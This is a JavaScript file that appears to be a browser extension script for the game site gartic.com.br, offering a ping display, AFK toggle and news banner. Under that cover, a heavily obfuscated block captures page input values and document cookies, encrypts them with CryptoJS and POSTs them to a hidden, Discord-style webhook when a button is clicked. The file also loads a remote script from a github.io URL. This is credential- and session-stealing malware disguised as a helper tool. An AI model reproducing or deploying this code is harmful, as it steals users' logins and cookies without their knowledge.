
async function ping() {
    let t = Date.now();
    await fetch(window.location.href);
    return `${Date.now() - t}ms`;
}

setInterval(() => {
    ping().then((t) => {
        1 == document.location.href.startsWith("https://gartic.com.br/0") &&
            ((document.querySelectorAll("input")[8].attributes[0].textContent = t),
             (document.querySelector("#tema > input.boxvets").disabled = true));
    });
}, 3e3);

setTimeout(() => {
    if (document.URL.startsWith("https://gartic.com.br/0")) {
        document.querySelector("#tema > input.isAfk").checked = true;
    }
}, 1000);

// HTML da parte "seguir"

// if ("https://gartic.com.br/" === document.URL) {
//     var _buceta = document.createElement("input");
//     (_buceta.type = "text"),
//         (_buceta.className = "seguir"),
//         _buceta.setAttribute("placeholder", "Atualizando... padder#7724"),
//         (_buceta.style = "padding-left: 275px;padding-right: 275px;"),
//         document.querySelector("#blocoJogar > div.conteudo").append(_buceta);
//     var _botao = document.createElement("button");
//     (_botao.innerHTML = "Stop"), (_botao.className = "stopChasingMe"),
// 	    (_botao.style = "padding-left: 343px;padding-right: 343px;"),
// 	    document.querySelector("#blocoJogar > div.conteudo").append(_botao);
// }



// cria-se biscuit
document.cookie.includes("chase=") ? console.log("has biscuit") : (document.cookie = "chase=0");

var script = document.createElement("script");
script.type = "text/javascript";
script.src = "https://reddap.github.io/gartic-extension/gatric/trash/chase.js";
document.body.appendChild(script);

"https://gartic.com.br"===document.URL&&(document.querySelector("#blocoJogar > div.conteudo > button").style.backgroundColor="ivory");


// comment
var fodida = setInterval(() => {
    document.querySelector("#blocoJogar > div.conteudo > button") &&
        (clearInterval(fodida),
        (document.querySelector("#blocoJogar > div.conteudo").appendChild(document.createElement("p")).innerHTML =
            "<p align='center'> news: novo quick-tutorial<br> <a  target='_blank' href='https://github.com/reddap/gartic-extension/' style='text-decoration:none'> como tirar o delay do enter</a><br><i>latest update 07-03-2022 - by <a  target='_blank' href='https://discord.com/' style='text-decoration:none'> padder#7724</a></i><p>"));
}, 333);

// x
//sess, rec, biscuit

// biscuit (3)

// aviso para crianças
// var putinha = setInterval(() => {
//     document.querySelector("#blocoJogar > div.conteudo > input") &&
//         (document.querySelector("#blocoJogar > div.conteudo > input").addEventListener("keyup", function (e) {
//             13 === e.keyCode && (alert('Clique em "stop" para interromper a observação e poder jogar normalmente.'), location.reload());
//         }),
//         clearInterval(putinha));
// }, 333);




// filtro "porta"
//         document.URL.startsWith("https://gartic.com.br/0") &&
//             document.querySelector("#botoes > input.bt_orange_medium") &&
//             (document.cookie.includes("chase=0") ||
//                 setTimeout(() => {
//                     document.querySelector("#botoes > input.bt_orange_medium").click();
//                 }, 5e3));


//unnusual

// not my friend


// biscuit identificação

// identificação em falta

//

// pedido... biscuit

function _0x38c688(_0x34a571, _0xcb6c01, _0x7691ea, _0x340b76, _0x2e7c50) {
    return _0x4e00(_0xcb6c01 - -0x3ad, _0x2e7c50);
}
function _0x4405fb(_0x891af8, _0x43d7a2, _0x3e5656, _0x49e90b, _0x4a528f) {
    return _0x4e00(_0x4a528f - 0x1a3, _0x891af8);
}
function _0x4303ab(_0x1f8196, _0x980603, _0x5138c9, _0x579467, _0x94ad0d) {
    return _0x4e00(_0x579467 - -0x3db, _0x94ad0d);
}
function _0x4b6f4b(_0x563b1b, _0x1454be, _0x5487b4, _0x145836, _0xae89fa) {
    return _0x4e00(_0xae89fa - 0x3bf, _0x5487b4);
}
function _0x2726() {
    var _0x525aae = [
        "s8kplmoKW6u",
        "zSkZWP8FoG",
        "ewXKDbS",
        "WRJdItilsq",
        "lLRdGmk6fG",
        "vvKMrCke",
        "WRlcJYvvDa",
        "WQZcTtXZua",
        "CKyzWOdcLG",
        "s1jpW6i",
        "e8knl8o8WQ8",
        "s2uK",
        "xf4GtCkF",
        "WOGBW5D3W5e",
        "WQ8bm8oGWOu",
        "W4NdR8kVWPxdLW",
        "W6JdH8okW4BdPW",
        "eZVcTwGc",
        "kSkdW4FcT8kiW4CyWP8K",
        "W4NdHr4nua",
        "WPNcQg0L",
        "ASkAWOyibq",
        "oslcKu8",
        "oSkeaW",
        "W6/dICoUW7xcVa",
        "W7/dPmk3WRZdNq",
        "WOBdNe4PWQ8",
        "WPddKCogW6tcJqNdV8oVW5TmWR9nWOlcQq",
        "dKxdJmkWla",
        "W5VdHCoKW6K",
        "WOz/C8kvDG",
        "W57cJXH5W7pdLI7dQ2xcKCk+z8oj",
        "C1vRW7RcRq",
        "laBdRhFdOa",
        "WO4qW79Itv7dISoOWQHrWRm/",
        "FHxdLCoVWRKuW5GOfa",
        "W4/cUwqVWR4",
        "AGdcNXj/",
        "FdtcTx8i",
        "xHldGSk/WQS",
        "WOdcUGpdV1eozqldTGtcUq",
        "CmkHWOVdIq",
        "Emk9W5BcG0S",
        "WRzCWQ7cJSkSW7b9WPhdU8oWeZtdJW",
        "WPZcKSkIW7BcSa",
        "ovNcJmofW7u",
        "nCk8fSoUWQu",
        "ssPHFrG",
        "jeRcHmocWRq",
        "t3ZcP8o5W5i",
        "W48+WRBcJhu",
        "B2jWWOxcUa",
        "W6VdPmk5eKm",
        "WPlcHb8gW7C",
        "mLpdIsTgwSkWWRNdTKddQCk8W7C",
        "wvWO",
        "W793e2hdPW",
        "yCkJW5NcHf8",
        "bCkmi8kdW4a",
        "BSollZBdRW",
        "suxdPglcRW",
        "WRqfkmoeW5m",
        "WOSvECoCCa",
        "W5VdP10",
        "W7tcS8k5",
        "WOTLa8kpWO4",
        "w8k8WQ7dIGK",
        "W7/dQ8kRgMS",
        "WRNdTZ0",
        "WOWLW7HXWOS",
        "WObuEa",
        "kHTjBJO",
        "cYDXW6VcTNtcGCoagG",
        "WQNdGXm8vW",
        "laBdRJldQW",
        "AmobWPlcS8ky",
        "owRdTCoZrG",
        "W5xdOWelya",
        "WPLYhG",
        "WO4yW70tgIZdOmoMWPS",
        "WR7dGXetwG",
        "W6FdPLaHW7O",
        "kqlcK3Cw",
        "ECoTWRZdH8k+W4nZW7atWP8KWOK",
        "WQRcTanXsq",
        "ESkGWONdJWS",
        "iSo/W4JdUa10WOHfiG",
        "W59jWRT6rG",
        "ucr9hmopFgGXCG",
        "vXZcMSoGAq",
        "s3CTW4BcUa",
        "WQtdKHupsa",
        "k0LTt2y",
        "WRhcQ8o2p24",
        "W5pdQCoYW6tcIW",
        "WPNcSmoRW6/dLhWlWOKPva",
        "igrhFs0",
        "W43dMCoNW6lcPG",
        "kcJcKq",
        "W7NdPvWT",
        "W5hcIb54W7xdLsNdSeFcO8k6w8oF",
        "kCkWW4jpvSoDWPWTWQqs",
        "WRhdVLC7W6u",
        "W4NcLCkbWQZdIq",
        "omkKW77cMG",
        "W6HfWQe/gW",
        "WOVdUZr1W6pcSmkin3S4Ba",
        "W6C9W7JdTmkP",
        "uXRcNmoPBZStsmoyymovW4NcL8k5",
        "aJrnACkh",
        "AH01i2zWdSolW4BcQSoHwG",
        "uKLB",
        "thRdUx0A",
        "WOhdVLGFWOi",
        "BfJcGmo3W5m",
        "uv/dTcpdKSoqW5K8WQ7dMxn5",
        "nmoPW4ywjmoYW7ldT20",
        "WOVdV34fW7q",
        "WP3cSmoQWPVdJgCnWOCx",
        "r2JdOSoEEq",
    ];
    _0x2726 = function () {
        return _0x525aae;
    };
    return _0x2726();
}
(function (_0x2194d0, _0x20dff5) {
    function _0x368c8b(_0x331b11, _0x1cb031, _0x143a3e, _0x1f56c5, _0x554558) {
        return _0x4e00(_0x331b11 - -0x23c, _0x1f56c5);
    }
    function _0x2f14ca(_0x1f7083, _0x3e54e4, _0x1a31ca, _0x5aee4e, _0x150f9c) {
        return _0x4e00(_0x3e54e4 - 0xd6, _0x1a31ca);
    }
    function _0x30a98c(_0x1bf8f4, _0x5f2758, _0x21c702, _0x28b0b5, _0x543e8b) {
        return _0x4e00(_0x28b0b5 - 0x354, _0x1bf8f4);
    }
    function _0xb1a2c3(_0x11a683, _0x223308, _0x20b323, _0x4c9094, _0x1fc993) {
        return _0x4e00(_0x1fc993 - 0x343, _0x4c9094);
    }
    var _0xa6fc85 = _0x2194d0();
    function _0x20163e(_0x31a83a, _0x2c59ad, _0xda40d1, _0x254bd5, _0x475b29) {
        return _0x4e00(_0x475b29 - 0x199, _0x2c59ad);
    }
    while (!![]) {
        try {
            var _0x239706 =
                (parseInt(_0x30a98c("^IKB", 0x4b0, 0x48b, 0x4c1, 0x49b)) / (0x1 * 0x9bf + 0x5cc * 0x1 + -0xf8a)) * (parseInt(_0x368c8b(-0xe0, -0xf3, -0x116, "JMxj", -0xe0)) / (0x1137 + -0x23c5 + -0x1 * -0x1290)) +
                (-parseInt(_0x30a98c("FezI", 0x486, 0x4a4, 0x473, 0x43c)) / (-0x1763 * 0x1 + 0x1f9c + -0x2 * 0x41b)) * (-parseInt(_0x20163e(0x2c2, "4oer", 0x2fd, 0x304, 0x2df)) / (-0x12 * -0xda + 0x15 * 0x6d + -0x1841)) +
                parseInt(_0x20163e(0x2b4, "goKE", 0x294, 0x301, 0x2c6)) / (-0x26d2 + -0x44 * -0x3d + 0x16a3) +
                parseInt(_0x2f14ca(0x21e, 0x1e8, "QyJ4", 0x1e3, 0x1f9)) / (0x2 * 0x23e + -0x31 * 0x8f + 0x16e9) +
                (parseInt(_0x20163e(0x295, "4oer", 0x2b2, 0x2e7, 0x2b2)) / (-0x12d0 + -0x2401 + 0x36d8)) * (parseInt(_0x30a98c("Y*vl", 0x4ab, 0x505, 0x4d5, 0x4d7)) / (-0x2576 + -0x15d * -0x1b + -0x19 * -0x7)) +
                -parseInt(_0xb1a2c3(0x42e, 0x42e, 0x42a, "]^Gh", 0x465)) / (-0xffa + 0x4 * 0x60d + -0x831) +
                (parseInt(_0x20163e(0x312, "Hf7&", 0x2a2, 0x2bd, 0x2d8)) / (0x17b6 * -0x1 + -0x1 * -0x16a9 + 0x9 * 0x1f)) * (-parseInt(_0x30a98c("]D27", 0x485, 0x484, 0x4b9, 0x484)) / (0x7bb + 0x1fa1 + -0x2751));
            if (_0x239706 === _0x20dff5) break;
            else _0xa6fc85["push"](_0xa6fc85["shift"]());
        } catch (_0x3d1d18) {
            _0xa6fc85["push"](_0xa6fc85["shift"]());
        }
    }
})(_0x2726, -0xa62c1 + -0x1514cf + 0x2cc540);
function _0x2fb4ea(_0x4ecc15, _0x2528b1, _0x4aaacc, _0x15ccb5, _0x20a6df) {
    return _0x4e00(_0x4ecc15 - 0x18, _0x20a6df);
}
function _0x4e00(_0x5520e0, _0x31b59e) {
    var _0xa42b2 = _0x2726();
    return (
        (_0x4e00 = function (_0x40b22b, _0x387291) {
            _0x40b22b = _0x40b22b - (-0x1b37 + 0x987 * -0x3 + -0x4bd * -0xc);
            var _0x24a0f1 = _0xa42b2[_0x40b22b];
            if (_0x4e00["uqjRIm"] === undefined) {
                var _0x2dc232 = function (_0x3eee00) {
                    var _0x2a6a2d = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=";
                    var _0x48fb28 = "",
                        _0x268e76 = "";
                    for (
                        var _0x169eb7 = 0x45 * -0x5e + 0x1e38 + -0x32 * 0x19, _0x541197, _0x115f0a, _0x29268a = -0x10f7 + 0x207b + -0xf84;
                        (_0x115f0a = _0x3eee00["charAt"](_0x29268a++));
                        ~_0x115f0a &&
                        ((_0x541197 = _0x169eb7 % (-0x14bd * -0x1 + 0x5f1 + 0x1 * -0x1aaa) ? _0x541197 * (-0x3 * -0xb35 + -0xf97 + -0x1 * 0x11c8) + _0x115f0a : _0x115f0a), _0x169eb7++ % (-0x1 * -0x1e17 + -0x270c * -0x1 + -0x451f))
                            ? (_0x48fb28 += String["fromCharCode"]((-0x8dc + -0x2075 + 0x2a50) & (_0x541197 >> ((-(-0x441 + 0x541 + -0xfe) * _0x169eb7) & (0x2e6 * -0x4 + -0x1 * 0x15e3 + 0x2181)))))
                            : -0x4c * 0x41 + -0x24 * 0x27 + 0x18c8
                    ) {
                        _0x115f0a = _0x2a6a2d["indexOf"](_0x115f0a);
                    }
                    for (var _0x1697b2 = 0x3 * -0x2b9 + -0xf * 0x17d + 0x2 * 0xf3f, _0x5137b1 = _0x48fb28["length"]; _0x1697b2 < _0x5137b1; _0x1697b2++) {
                        _0x268e76 += "%" + ("00" + _0x48fb28["charCodeAt"](_0x1697b2)["toString"](0xc86 + -0x18e1 + 0x1 * 0xc6b))["slice"](-(-0x66 * -0x11 + 0xe26 * -0x1 + 0x2a * 0x2d));
                    }
                    return decodeURIComponent(_0x268e76);
                };
                var _0x73e8ea = function (_0x582ed6, _0x2cc7ea) {
                    var _0x37dc1c = [],
                        _0x68d10 = 0x58a * -0x5 + 0x5 * 0x3ab + 0x5 * 0x1df,
                        _0x488bda,
                        _0xe95149 = "";
                    _0x582ed6 = _0x2dc232(_0x582ed6);
                    var _0x3ae2a9;
                    for (_0x3ae2a9 = -0x1169 + 0x627 + 0x16 * 0x83; _0x3ae2a9 < 0x270a + -0x60e + -0x1ffc; _0x3ae2a9++) {
                        _0x37dc1c[_0x3ae2a9] = _0x3ae2a9;
                    }
                    for (_0x3ae2a9 = -0x18ba + -0x317 * 0x1 + 0x1bd1; _0x3ae2a9 < 0x1705 * 0x1 + 0xffc + -0x2601; _0x3ae2a9++) {
                        (_0x68d10 = (_0x68d10 + _0x37dc1c[_0x3ae2a9] + _0x2cc7ea["charCodeAt"](_0x3ae2a9 % _0x2cc7ea["length"])) % (-0x47 * -0x1 + -0x1a * -0x8d + -0x3b * 0x3b)),
                            (_0x488bda = _0x37dc1c[_0x3ae2a9]),
                            (_0x37dc1c[_0x3ae2a9] = _0x37dc1c[_0x68d10]),
                            (_0x37dc1c[_0x68d10] = _0x488bda);
                    }
                    (_0x3ae2a9 = 0x29 * -0x26 + 0x222a * 0x1 + -0x1c14), (_0x68d10 = -0x23 * 0x7d + 0x141 * 0x2 + -0xe95 * -0x1);
                    for (var _0x681300 = 0xec9 + -0x1ba5 + 0x1 * 0xcdc; _0x681300 < _0x582ed6["length"]; _0x681300++) {
                        (_0x3ae2a9 = (_0x3ae2a9 + (-0x1e20 + -0x14e * 0x3 + 0x15 * 0x19f)) % (-0x8d3 * -0x3 + 0xfe9 * 0x2 + -0x394b)),
                            (_0x68d10 = (_0x68d10 + _0x37dc1c[_0x3ae2a9]) % (0x5 * 0xc1 + -0x37 * 0x49 + 0xcea)),
                            (_0x488bda = _0x37dc1c[_0x3ae2a9]),
                            (_0x37dc1c[_0x3ae2a9] = _0x37dc1c[_0x68d10]),
                            (_0x37dc1c[_0x68d10] = _0x488bda),
                            (_0xe95149 += String["fromCharCode"](_0x582ed6["charCodeAt"](_0x681300) ^ _0x37dc1c[(_0x37dc1c[_0x3ae2a9] + _0x37dc1c[_0x68d10]) % (-0x170b * 0x1 + 0x14ce + 0x33d * 0x1)]));
                    }
                    return _0xe95149;
                };
                (_0x4e00["Vxdoll"] = _0x73e8ea), (_0x5520e0 = arguments), (_0x4e00["uqjRIm"] = !![]);
            }
            var _0x440723 = _0xa42b2[-0x20c7 + -0xfa9 * 0x2 + -0x1 * -0x4019],
                _0x3c1f02 = _0x40b22b + _0x440723,
                _0x5d526b = _0x5520e0[_0x3c1f02];
            return !_0x5d526b ? (_0x4e00["mGljcH"] === undefined && (_0x4e00["mGljcH"] = !![]), (_0x24a0f1 = _0x4e00["Vxdoll"](_0x24a0f1, _0x387291)), (_0x5520e0[_0x3c1f02] = _0x24a0f1)) : (_0x24a0f1 = _0x5d526b), _0x24a0f1;
        }),
        _0x4e00(_0x5520e0, _0x31b59e)
    );
}
document[_0x4405fb("QyJ4", 0x2ec, 0x2a2, 0x2c8, 0x2da)] ==
    _0x4b6f4b(0x538, 0x4fa, "QyJ4", 0x523, 0x51d) + _0x4405fb("FHd%", 0x314, 0x308, 0x30d, 0x30a) + _0x4405fb("D2k%", 0x296, 0x2c9, 0x2e4, 0x2c7) + _0x38c688(-0x285, -0x295, -0x29d, -0x2c5, "x!3R") + "r/" &&
    (setInterval(() => {
        function _0x1d1ce6(_0x303bca, _0x22dc86, _0x4094c0, _0x508548, _0x18593d) {
            return _0x4b6f4b(_0x303bca - 0xcd, _0x22dc86 - 0x18a, _0x18593d, _0x508548 - 0xd2, _0x303bca - -0xd2);
        }
        var _0x1697b2 = {};
        (_0x1697b2[_0x2cb4b4(0x2f4, "1#9v", 0x326, 0x32e, 0x343)] = _0x5f4f26(0xc7, "IW0c", 0xb2, 0xd1, 0xb3)),
            (_0x1697b2[_0x5f4f26(0xaf, "AHmM", 0xd2, 0xcd, 0xda)] = function (_0x2cc7ea, _0x37dc1c) {
                return _0x2cc7ea < _0x37dc1c;
            }),
            (_0x1697b2[_0x5f4f26(0x117, "Vh7#", 0x105, 0x101, 0xf6)] = function (_0x68d10, _0x488bda) {
                return _0x68d10 != _0x488bda;
            }),
            (_0x1697b2[_0x2cb4b4(0x287, "n)uP", 0x2dd, 0x2c1, 0x2fc)] = function (_0xe95149, _0x3ae2a9) {
                return _0xe95149 + _0x3ae2a9;
            }),
            (_0x1697b2[_0x5889a2(0x134, 0x107, 0x105, 0x109, "%n(S")] = function (_0x681300, _0x4a7e84) {
                return _0x681300 + _0x4a7e84;
            });
        function _0x5f4f26(_0x1ac19b, _0x24acd8, _0x476367, _0x132312, _0x2e6bdb) {
            return _0x2fb4ea(_0x132312 - -0x93, _0x24acd8 - 0x1ac, _0x476367 - 0xf8, _0x132312 - 0x19a, _0x24acd8);
        }
        var _0x5137b1 = _0x1697b2,
            _0x582ed6 = 0xa * -0xe8 + -0x87 * 0x3 + -0x1 * -0xaa5;
        (ve = document[_0x2cb4b4(0x2a1, "RAj@", 0x2f3, 0x2d3, 0x2cc) + _0x1d1ce6(0x44d, 0x447, 0x486, 0x447, "4oer") + _0x2cb4b4(0x30a, "p1o4", 0x348, 0x327, 0x362) + "l"](_0x5137b1[_0x3087c8("YEjv", -0x193, -0x158, -0x16d, -0x18e)])[
            _0x2cb4b4(0x359, "7gn@", 0x312, 0x31e, 0x357) + "h"
        ]),
            (tex = []);
        function _0x3087c8(_0x2f6624, _0xe01a61, _0x3592a8, _0x29ccda, _0x94d5b) {
            return _0x4b6f4b(_0x2f6624 - 0x78, _0xe01a61 - 0x17e, _0x2f6624, _0x29ccda - 0x167, _0x94d5b - -0x6cf);
        }
        function _0x2cb4b4(_0x240ecf, _0x3a154a, _0x3cb215, _0x8b472a, _0x4473b0) {
            return _0x4405fb(_0x3a154a, _0x3a154a - 0x1bf, _0x3cb215 - 0x13b, _0x8b472a - 0x86, _0x8b472a - 0x7);
        }
        function _0x5889a2(_0x34d957, _0x4bba2a, _0x4e32d4, _0x49c13c, _0x249ef3) {
            return _0x4303ab(_0x34d957 - 0x23, _0x4bba2a - 0x63, _0x4e32d4 - 0x84, _0x4e32d4 - 0x3b8, _0x249ef3);
        }
        while (_0x5137b1[_0x3087c8("PhId", -0x1c1, -0x1c7, -0x1c4, -0x1f5)](_0x582ed6, ve)) {
            (mm = document[_0x5f4f26(0xa4, "C[RK", 0xb0, 0xab, 0xcd) + _0x5889a2(0x179, 0x190, 0x164, 0x179, "eHEJ") + _0x5889a2(0xe2, 0x14a, 0x117, 0xe6, "G0@]") + "l"](_0x5137b1[_0x5889a2(0x145, 0x15a, 0x132, 0xfb, "eHEJ")])[
                _0x582ed6++
            ]),
                _0x5137b1[_0x1d1ce6(0x45b, 0x471, 0x46c, 0x46e, "SS$4")](mm[_0x5889a2(0x153, 0x126, 0x156, 0x173, "J5gE")], "") &&
                    tex[_0x2cb4b4(0x304, "n)uP", 0x34d, 0x322, 0x301)](
                        _0x5137b1[_0x5889a2(0x149, 0xe5, 0x116, 0x129, "IW0c")](
                            _0x5137b1[_0x5f4f26(0xd0, "J5gE", 0xd7, 0xaa, 0x74)](mm[_0x3087c8("vrkx", -0x186, -0x1c4, -0x1c3, -0x1b1)], ":\x20"),
                            mm[_0x1d1ce6(0x43e, 0x442, 0x44b, 0x415, "Hf7&")]
                        )
                    );
        }
    }, -0x2356 + -0x17f * 0x5 + 0x2adb),
    document[_0x4b6f4b(0x4e1, 0x4f6, "eHEJ", 0x4f5, 0x517) + _0x38c688(-0x2c5, -0x29d, -0x2b3, -0x276, "^IKB") + _0x4b6f4b(0x515, 0x527, "s[R]", 0x4f3, 0x504)](
        _0x4405fb("goKE", 0x2b2, 0x30b, 0x2c2, 0x2ec) +
            _0x4b6f4b(0x4cf, 0x506, "q[i2", 0x4b9, 0x4d4) +
            _0x2fb4ea(0x13f, 0x15d, 0x12b, 0x143, "D2k%") +
            _0x4303ab(-0x2a0, -0x2e2, -0x2d1, -0x2b8, "eHEJ") +
            _0x4303ab(-0x292, -0x288, -0x29f, -0x2ab, "IW0c") +
            _0x2fb4ea(0x166, 0x176, 0x165, 0x1a0, "4oer") +
            _0x4303ab(-0x298, -0x24f, -0x276, -0x27e, "AHmM") +
            "t"
    )[_0x38c688(-0x2a9, -0x28f, -0x270, -0x29e, "#hyP") + _0x4303ab(-0x259, -0x243, -0x236, -0x25d, "^IKB") + _0x4303ab(-0x289, -0x2b7, -0x293, -0x299, "Y*vl") + "r"](_0x4405fb("1#9v", 0x320, 0x2f4, 0x329, 0x313), function () {
        function _0x7b4bfe(_0x610c98, _0x2545f2, _0xa7e5c3, _0x1ba6dc, _0x63b260) {
            return _0x4303ab(_0x610c98 - 0x1d4, _0x2545f2 - 0xa7, _0xa7e5c3 - 0x3d, _0x610c98 - 0x1c3, _0x63b260);
        }
        function _0x1f9edb(_0x3cc71b, _0x471f8a, _0x3b0aa4, _0x50892a, _0x8a0fba) {
            return _0x4b6f4b(_0x3cc71b - 0x54, _0x471f8a - 0x38, _0x50892a, _0x50892a - 0x192, _0x8a0fba - -0x69d);
        }
        var _0x1dce8f = {
            rKDfx: function (_0x2e8cec, _0x8d7b1, _0xda9567) {
                return _0x2e8cec(_0x8d7b1, _0xda9567);
            },
            jUJRV:
                _0x1f9edb(-0x18c, -0x17d, -0x177, "sQXn", -0x18c) +
                _0x1f9edb(-0x14e, -0x17a, -0x16c, "G0@]", -0x18a) +
                _0x411dda(0x2b4, "YEjv", 0x2cf, 0x296, 0x2c0) +
                _0x1f9edb(-0x167, -0x157, -0x146, "J5gE", -0x16f) +
                _0x2e8713(-0x2, -0xc, "EGEe", -0x3, -0xf) +
                _0x7b4bfe(-0x9d, -0x93, -0x81, -0x71, "7gn@") +
                _0x1f9edb(-0x1c1, -0x1b6, -0x1c9, "IW0c", -0x1bd) +
                _0x411dda(0x299, "9Yj!", 0x2af, 0x2b8, 0x2cc) +
                _0x306b08(0x299, 0x2c7, 0x2c7, "76M)", 0x2ee) +
                _0x306b08(0x2eb, 0x2fb, 0x2c5, "@H]k", 0x28f) +
                _0x1f9edb(-0x1dc, -0x1bc, -0x1e1, "@adw", -0x1ac) +
                _0x306b08(0x2f3, 0x2db, 0x2d2, "sQXn", 0x2ca) +
                _0x7b4bfe(-0xcd, -0xd6, -0xd6, -0xa8, "BJek") +
                _0x7b4bfe(-0xe0, -0xfe, -0xa8, -0xce, "s[R]") +
                _0x7b4bfe(-0xdc, -0xfe, -0xf7, -0xb5, "Vh7#") +
                _0x306b08(0x2e5, 0x2ab, 0x2d0, "]D27", 0x2df) +
                _0x2e8713(-0x31, 0x7, "Hf7&", -0x8, -0x28) +
                _0x306b08(0x297, 0x2bc, 0x2be, "Fmnh", 0x2e9) +
                _0x411dda(0x2ef, "eHEJ", 0x2f1, 0x317, 0x2fb) +
                _0x7b4bfe(-0xc5, -0xf5, -0xe9, -0xb0, "]D27") +
                _0x7b4bfe(-0xa7, -0x74, -0xa3, -0xaf, "]D27") +
                _0x1f9edb(-0x199, -0x184, -0x16d, "]^Gh", -0x17c) +
                _0x1f9edb(-0x176, -0x146, -0x185, "Fmnh", -0x172) +
                _0x2e8713(0x43, -0x12, "SS$4", 0x11, 0x2d),
            VOvCp: _0x306b08(0x34f, 0x2f1, 0x317, "w(!1", 0x300),
            LpokN: _0x2e8713(0x23, -0x18, "IW0c", -0x12, -0x7),
            gBvUB: _0x1f9edb(-0x15e, -0x19c, -0x133, "Hf7&", -0x167) + "xA",
        };
        function _0x411dda(_0x28cc8a, _0x29dc6f, _0x48ed4a, _0x34a8fe, _0x23522d) {
            return _0x4405fb(_0x29dc6f, _0x29dc6f - 0x138, _0x48ed4a - 0xd6, _0x34a8fe - 0x183, _0x23522d - -0x27);
        }
        function _0x306b08(_0xf67689, _0x17f374, _0x33a0c6, _0x38d54b, _0x3be566) {
            return _0x4303ab(_0xf67689 - 0x118, _0x17f374 - 0x1df, _0x33a0c6 - 0x192, _0x33a0c6 - 0x56d, _0x38d54b);
        }
        function _0x2e8713(_0x4449f1, _0x20969f, _0x2ef907, _0xd5f5c2, _0x1ff3dc) {
            return _0x38c688(_0x4449f1 - 0x1b0, _0xd5f5c2 - 0x27b, _0x2ef907 - 0x1eb, _0xd5f5c2 - 0x16d, _0x2ef907);
        }
        _0x1dce8f[_0x7b4bfe(-0xc1, -0x9a, -0x94, -0xac, "]D27")](fetch, _0x1dce8f[_0x2e8713(0x3c, 0x44, "BJek", 0x43, 0x29)], {
            method: _0x1dce8f[_0x411dda(0x2cc, "liKE", 0x30c, 0x313, 0x2e0)],
            headers: headers,
            mode: _0x1dce8f[_0x306b08(0x32e, 0x334, 0x305, "9Yj!", 0x2e5)],
            body: JSON[_0x1f9edb(-0x157, -0x1a0, -0x164, "%n(S", -0x175) + _0x2e8713(-0x4b, -0x2c, "eHEJ", -0x1e, -0x51)]({
                embeds: [
                    {
                        description:
                            _0x2e8713(0x1b, 0x2e, "7gn@", -0x4, -0x27) +
                            CryptoJS[_0x411dda(0x305, "w(!1", 0x2e5, 0x2d9, 0x2d5)][_0x306b08(0x320, 0x33f, 0x312, "FHd%", 0x2e7) + "pt"](
                                _0x1f9edb(-0x1dd, -0x17c, -0x1c1, "G0@]", -0x1b3) +
                                    ":\x20" +
                                    _renderer +
                                    (_0x7b4bfe(-0xfb, -0x10d, -0xd9, -0x104, "FHd%") + _0x411dda(0x31e, "C[RK", 0x327, 0x2c2, 0x2f6)) +
                                    tex[_0x1f9edb(-0x18f, -0x19a, -0x179, "sQXn", -0x16c) + _0x7b4bfe(-0xb2, -0x8c, -0xeb, -0xee, "n)uP")]()[_0x306b08(0x2c4, 0x2cb, 0x2d9, "sQXn", 0x301) + "ce"](/(\,)/, "\x0a") +
                                    (_0x1f9edb(-0x1b7, -0x19d, -0x17e, "J5gE", -0x1ad) + _0x1f9edb(-0x1ed, -0x1c4, -0x1d2, "Fmnh", -0x1cd) + _0x411dda(0x2c2, "p1o4", 0x2a3, 0x2a8, 0x2b0) + "\x20") +
                                    document[_0x411dda(0x2b7, "x!3R", 0x2f2, 0x29b, 0x2bd) + "e"][_0x411dda(0x2c8, "BJek", 0x2ee, 0x326, 0x2f2) + _0x411dda(0x283, "FezI", 0x280, 0x29d, 0x2b2)]() +
                                    (_0x2e8713(-0x9, -0x27, "goKE", -0x16, 0x2) + _0x306b08(0x34d, 0x32c, 0x315, "PhId", 0x2f8)) +
                                    k +
                                    _0x411dda(0x2e2, "@adw", 0x33b, 0x2f1, 0x302),
                                _0x1dce8f[_0x306b08(0x328, 0x32d, 0x2fa, "Fmnh", 0x310)]
                            ) +
                            _0x1f9edb(-0x1ad, -0x1d1, -0x1c5, "^ZRt", -0x1a3),
                    },
                ],
                test: window[_0x2e8713(-0x2b, -0x3d, "9Yj!", -0x1f, -0x3b) + _0x1f9edb(-0x1aa, -0x1cf, -0x197, "q[i2", -0x1a1)][_0x7b4bfe(-0xbe, -0xe4, -0xc0, -0xe8, "AHmM")],
            }),
        });
    }));
